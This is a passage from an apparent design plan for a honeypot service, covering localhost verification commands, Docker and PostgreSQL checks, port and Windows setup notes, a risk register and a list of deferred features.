curl.exe http://localhost:8090/stats

# --- metrics (slice 5+) ---
curl.exe http://localhost:8000/metrics

# --- database checks (slice 4+) ---
docker exec hb-postgres psql -U honeybadger -d honeybadger -c "select count(*) from events;"
docker exec hb-postgres psql -U honeybadger -d honeybadger -c "select count(*) from events where pass_hash not like 'sha256:%';"

# --- full stack (slice 6) ---
docker compose up --build -d
docker compose ps
docker compose logs -f backend
docker compose down
```

**Port conflicts:** `HB_SSH_PORT`, `HB_HTTP_PORT`, `HB_METRICS_PORT`,
`HB_API_PORT` override the defaults.

**Windows notes:** use `py`, `curl.exe`, and
`UserKnownHostsFile=NUL`; allow the firewall prompt on first bind, or bind
`HB_SSH_HOST=127.0.0.1` for local-only tests.

---

## 12. Risk register

| Risk | Slice | Mitigation |
|---|---|---|
| asyncssh `client_version` not ready in `connection_made` | 1 | bounded poll + `begin_auth` fallback + emit-once flag (verified in asyncssh source) |
| Windows event loop / socket quirks | 1–2 | use `asyncio.run`, test on Windows, bind `127.0.0.1` locally |
| Port 8022/8081 already in use | 1–2 | env overrides; fail fast with a clear log |
| GeoIP egress vs containment | 3, 6 | plain bridge allows `ip-api` egress (documented); tightening via allow-list/offline MaxMind/`NullProvider` is a backend-slice decision |
| ip-api rate limits | 3 | 30-day cache, timeouts, fail-open |
| Plaintext credentials leaking | all | hash at edge only; security script in slice 6; never log raw passwords |
| Payload fetching by accident | 3 | `PayloadRecorder` never performs I/O; code review rule |
| DB unavailable at startup | 4 | retry loop, health endpoint, compose `depends_on` healthchecks |
| Backend image not buildable yet | 6 | `docker-compose.yml` is complete and `docker compose config` valid; dashboard/monitoring start independently; `backend` gated on `backend/Dockerfile` |
| Test suite slowing down | 4+ | DB tests use SQLite; integration tests bind port 0 |
| Docs drifting from code | all | update this file + `docs/API.md` in every slice commit |

---

## 13. Deliberately deferred

These are out of scope until slices 1–6 are done:

- MaxMind/GeoLite2 full integration and automatic DB updates.
- Persistent stable SSH host keys and key rotation.
- Multi-node deployment / Kubernetes.
- Authentication on the API/dashboard.
- Payload quarantine file writing (`CAPTURE_PAYLOADS`) beyond metadata.
- Alembic migration tooling (v1 uses `metadata.create_all` + an init SQL file).
- GeoIP cache backed by PostgreSQL (v1 uses in-memory).
- Backend-side alert evaluation (`backend/alerts.py`) — Prometheus is the single alerting authority, and the backend only exports metrics.
